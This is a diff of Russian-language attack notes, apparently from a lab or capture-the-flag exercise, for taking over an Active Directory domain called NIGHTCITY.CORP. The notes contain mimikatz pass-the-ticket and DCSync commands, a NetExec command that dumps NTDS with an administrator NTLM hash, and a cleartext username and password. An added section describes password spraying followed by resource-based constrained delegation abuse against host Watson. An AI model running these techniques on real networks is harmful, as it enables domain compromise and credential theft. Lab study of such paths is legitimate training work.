@@ -26,3 +26,7 @@ kerberos::ptt C:\Users\David\Desktop\ticket-filename.kirbi
 lsadump::dcsync /user:Administrator
 ```
 Остается получить ntds ```nxc smb 172.31.200.101 -u Administrator -H 90c1e25b12005c3146f13228043aa87d  --ntds```
+
+
+## Третий вариант взятия ДОМЕН АДМИНА
+спреим учетки ```Placide@NIGHTCITY.CORP:Ktnj2024``` и ```Dum_Dum@NIGHTCITY.CORP```. У них есть genericWrite на Watson, что позволяет сделать RBCD на этом хосте и заовнить его. 
